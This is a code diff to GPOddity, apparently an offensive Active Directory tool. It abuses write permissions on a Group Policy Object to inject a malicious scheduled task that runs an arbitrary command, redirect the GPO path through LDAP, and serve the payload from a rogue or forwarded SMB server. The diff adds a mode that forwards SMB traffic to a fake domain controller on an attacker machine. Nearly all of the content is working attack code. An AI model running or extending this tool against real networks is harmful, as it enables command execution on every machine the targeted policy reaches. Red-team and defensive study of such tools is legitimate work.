@@ -3,19 +3,22 @@ import typer
 import logging
 import traceback
 
+import _thread                      as thread
+import helpers.forwarder            as forwarder
+
 from time                           import sleep
 from impacket.ntlm                  import compute_lmhash, compute_nthash
 from ldap3                          import Server, Connection, NTLM
 from typing_extensions              import Annotated
 
-from helpers.smb_utils              import get_smb_connection, download_initial_gpo
+from helpers.smb_utils              import get_smb_connection, download_initial_gpo, create_empty_gpo
 from helpers.scheduledtask_utils    import write_scheduled_task
 from helpers.gpoddity_smbserver     import SimpleSMBServer
 from helpers.version_utils          import update_GPT_version_number
 from helpers.clean_utils            import init_save_file, save_attribute_value, clean
 from helpers.ldap_utils             import get_attribute, modify_attribute, update_extensionNames
 
-from conf                           import OUTPUT_DIR, bcolors, GPOTypes
+from conf                           import OUTPUT_DIR, bcolors, GPOTypes, SMBModes
 
 
 
@@ -33,12 +36,12 @@ def main(
         password: Annotated[str, typer.Option(help="The password of the user having write permissions on the GPO AD object", rich_help_panel="General options")] = None,
         hash: Annotated[str, typer.Option(help="The NTLM hash of the user having write permissions on the GPO AD object, with the format 'LM:NT'", rich_help_panel="General options")] = None,
 
-        machine_name: Annotated[str, typer.Option(help="[Optional] The name of a valid domain machine account, that will be used to perform Netlogon authentication (for instance, SRV01$). If omitted, will use the user specified with the --username option, and assume that it is a valid machine account", rich_help_panel="GPOddity smb server options")] = None,
-        machine_pass: Annotated[str, typer.Option(help="[Optional] The password of the machine account if specified with --machine-name", rich_help_panel="GPOddity smb server options")] = None,
-        machine_hash: Annotated[str, typer.Option(help="[Optional] The NTLM hash of the machine account if specified with --machine-name, with the format 'LM:NT'", rich_help_panel="GPOddity smb server options")] = None,
-        comment: Annotated[str, typer.Option(help="[Optional] Share's comment to display when asked for shares", rich_help_panel="GPOddity smb server options")] = None,
-        interface: Annotated[str, typer.Option(help="[Optional] The interface on which the GPOddity smb server should listen", rich_help_panel="GPOddity smb server options")] = '0.0.0.0',
-        port: Annotated[str, typer.Option(help="[Optional] The port on which the GPOddity smb server should listen", rich_help_panel="GPOddity smb server options")] = '445',
+        machine_name: Annotated[str, typer.Option(help="[Optional] The name of a valid domain machine account, that will be used to perform Netlogon authentication (for instance, SRV01$). If omitted, will use the user specified with the --username option, and assume that it is a valid machine account", rich_help_panel="SMB server options")] = None,
+        machine_pass: Annotated[str, typer.Option(help="[Optional] The password of the machine account if specified with --machine-name", rich_help_panel="SMB server options")] = None,
+        machine_hash: Annotated[str, typer.Option(help="[Optional] The NTLM hash of the machine account if specified with --machine-name, with the format 'LM:NT'", rich_help_panel="SMB server options")] = None,
+        comment: Annotated[str, typer.Option(help="[Optional] Share's comment to display when asked for shares", rich_help_panel="SMB server options")] = None,
+        interface: Annotated[str, typer.Option(help="[Optional] The interface on which the GPOddity smb server should listen", rich_help_panel="SMB server options")] = '0.0.0.0',
+        port: Annotated[str, typer.Option(help="[Optional] The port on which the GPOddity smb server should listen", rich_help_panel="SMB server options")] = '445',
 
         powershell: Annotated[bool, typer.Option("--powershell", help="[Optional] Use powershell instead of cmd for command execution", rich_help_panel="Malicious Group Policy Template generation options")] = False,
         gpo_type: Annotated[GPOTypes, typer.Option(help="[Optional] The type of GPO that we are targeting. Can either be 'user' or 'computer'", rich_help_panel="Malicious Group Policy Template generation options")] = GPOTypes.computer,
@@ -46,7 +49,11 @@ def main(
         dc_ip: Annotated[str, typer.Option(help="[Optional] The IP of the domain controller if the domain name can not be resolved.", rich_help_panel="General options")] = None,
         ldaps: Annotated[bool, typer.Option("--ldaps", help="[Optional] Use LDAPS on port 636 instead of LDAP", rich_help_panel="General options")] = False,
         verbose: Annotated[bool, typer.Option("--verbose", help="[Optional] Enable verbose output", rich_help_panel="General options")] = False,
-        no_smb_server: Annotated[bool, typer.Option("--no-smb-server", help="[Optional] Disable the smb server feature. GPOddity will only generate a malicious GPT, spoof the GPO location, wait, and cleanup", rich_help_panel="General options")] = False,
+        smb_mode: Annotated[SMBModes, typer.Option("--smb-mode", help="[Optional] 'Embedded' SMB server will host an SMB server on this machine. 'Forwarded' will forward SMB traffic to a fake Domain Controller (requires a machine account associated with a DNS record pointing to the attacker machine. Generated GPT should be uploaded on the fake DC). 'None' will not host any SMB server (generated GPT should be uploaded on a writable SMB share in the domain)", rich_help_panel="SMB server options")] = "embedded",
+        empty_gpo: Annotated[bool, typer.Option("--empty-gpo", help="[Optional] By default, GPOddity will clone the target GPO and add a malicious immediate task. If this flag is specified, an empty GPO will be used instead of a clone of the legitimate one (can be useful for some edge cases in which immediate tasks will not integrate well with existing GPOs)", rich_help_panel="SMB server options")] = False,
+        
+        attacker_ip: Annotated[str, typer.Option("--attacker-ip", help="[Optional] The IP of the attacker machine in the internal network (required for smb-mode 'forwarded')", rich_help_panel="SMB server options")] = '',
+        forwarded_ip: Annotated[str, typer.Option("--forwarded-ip", help="[Optional] The IP of the fake DC to which SMB traffic will be forwarded (required for smb-mode 'forwarded')", rich_help_panel="SMB server options")] = '',
         just_clean: Annotated[bool, typer.Option("--just-clean", help="[Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or ungraceful exit", rich_help_panel="General options")] = False,
         clean_file: Annotated[str, typer.Option("--clean-file", help="[Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or absolute path", rich_help_panel="General options")] = None
 ):
@@ -91,12 +98,15 @@ def main(
         logger.error(f"[!] To run the exploit, you should provide at least a GPO id, a domain, a username and password/hash, a command, a rogue SMB server IP and a rogue SMB server share.")
         return
 
-    if no_smb_server is not True and "sysvol" in rogue_smbserver_share.lower() or "netlogon" in rogue_smbserver_share.lower():
+    if smb_mode == SMBModes.embedded and "sysvol" in rogue_smbserver_share.lower() or "netlogon" in rogue_smbserver_share.lower():
         confirmation = typer.prompt("[!] You requested to run the embedded SMB server, but provided a share name that is by default protected by UNC path hardening. Are you sure you want to continue? [yes/no] ")
         if confirmation != 'yes':
             return
-    
-    if gpo_type != GPOTypes.computer and no_smb_server is not True:
+    if smb_mode == SMBModes.forwarded and (not attacker_ip or not forwarded_ip):
+        logger.error(f"[!] When running in smb-mode 'forwarded', the 'attacker-ip' and 'forwarded-ip' arguments should be provided.")
+        return
+
+    if gpo_type != GPOTypes.computer and smb_mode != SMBModes.embedded:
         confirmation = typer.prompt("[!] You are trying to target a User Group Policy Object while running the embedded SMB server. This will probably not work. Are you sure you want to continue? [yes/no] ")
         if confirmation != 'yes':
             return
@@ -114,22 +124,33 @@ def main(
 
     logger.warning(f"\n{bcolors.BOLD}=== GENERATING MALICIOUS GROUP POLICY TEMPLATE ==={bcolors.ENDC}\n")
 
-    # Download legitimate GPO
-    logger.warning("[*] Downloading the legitimate GPO from SYSVOL")
-    try:
-        smb_session = get_smb_connection(dc_ip, username, password, hash, domain)
-        download_initial_gpo(smb_session, domain, gpo_id)
-    except:
-        logger.critical(f"[!] Failed to download legitimate GPO from SYSVOL (dc_ip: {dc_ip} ; username: {username} ; password: {password} ; hash: {hash}). Exiting...", exc_info=True)
-        sys.exit(1)
-    logger.warning(f"{bcolors.OKGREEN}[+] Successfully downloaded legitimate GPO from SYSVOL to '{OUTPUT_DIR}' folder{bcolors.ENDC}")
+    if empty_gpo is not True:
+        # Download legitimate GPO
+        logger.warning("[*] Downloading the legitimate GPT from SYSVOL")
+        try:
+            smb_session = get_smb_connection(dc_ip, username, password, hash, domain)
+            download_initial_gpo(smb_session, domain, gpo_id)
+        except:
+            logger.critical(f"[!] Failed to download legitimate GPO from SYSVOL (dc_ip: {dc_ip} ; username: {username} ; password: {password} ; hash: {hash}). Exiting...", exc_info=True)
+            sys.exit(1)
+        logger.warning(f"{bcolors.OKGREEN}[+] Successfully downloaded legitimate GPO from SYSVOL to '{OUTPUT_DIR}' folder{bcolors.ENDC}")
+    else:
+        logger.warning("[*] Initializing empty GPT")
+        try:
+            smb_session = get_smb_connection(dc_ip, username, password, hash, domain)
+            create_empty_gpo(smb_session, domain, gpo_id)
+        except:
+            logger.critical(f"[!] Failed to initialize empty GPO (dc_ip: {dc_ip} ; username: {username} ; password: {password} ; hash: {hash}). Exiting...", exc_info=True)
+            sys.exit(1)
+        logger.warning(f"{bcolors.OKGREEN}[+] Successfully initialized empty GPT to '{OUTPUT_DIR}' folder{bcolors.ENDC}")
+
 
     # Write malicious scheduled task
-    logger.warning(f"[*] Injecting malicious scheduled task into downloaded GPO")
+    logger.warning(f"[*] Injecting malicious scheduled task into initialized GPT")
     try:
         write_scheduled_task(gpo_type, command, powershell)
     except:
-        logger.critical(f"[!] Failed to write malicious scheduled task to downloaded GPO. Exiting...", exc_info=True)
+        logger.critical(f"[!] Failed to write malicious scheduled task to downloaded GPT. Exiting...", exc_info=True)
         sys.exit(1)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious scheduled task{bcolors.ENDC}")
 
@@ -196,7 +217,10 @@ def main(
     try:
         attribute_name = "gPCMachineExtensionNames" if gpo_type == "computer" else "gPCUserExtensionNames"
         extensionName = get_attribute(ldap_session, gpo_dn, attribute_name)
-        updated_extensionName = update_extensionNames(extensionName)
+        if empty_gpo is not True:
+            updated_extensionName = update_extensionNames(extensionName)
+        else:
+            updated_extensionName = update_extensionNames("")
         result = modify_attribute(ldap_session, gpo_dn, attribute_name, updated_extensionName)
         if result is not True: raise Exception
     except:
@@ -208,7 +232,7 @@ def main(
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC extensionName attribute{bcolors.ENDC}")
 
     try:
-        if no_smb_server is not True:
+        if smb_mode == SMBModes.embedded:
             ### ========================================================== ###
             ### Launching GPOddity SMB server and waiting for GPO requests ###
             ### ========================================================== ###
@@ -235,6 +259,13 @@ def main(
             server.setSMBChallenge('')
             server.setLogFile('')
             server.start()
+        elif smb_mode == SMBModes.forwarded:
+            forwarder_settings = (attacker_ip, 445, forwarded_ip, 445)
+            thread.start_new_thread(forwarder.server, forwarder_settings)
+            logger.warning(f"\n{bcolors.BOLD}=== FORWARDING SMB TRAFFIC TO FAKE DC ==={bcolors.ENDC}")
+            logger.warning("[*] CTRL+C to stop and clean...")
+            while True:
+                sleep(10)
         else:
             logger.warning(f"\n{bcolors.BOLD}=== WAITING (not launching GPOddity SMB server) ==={bcolors.ENDC}")
             logger.warning("[*] CTRL+C to stop and clean...")
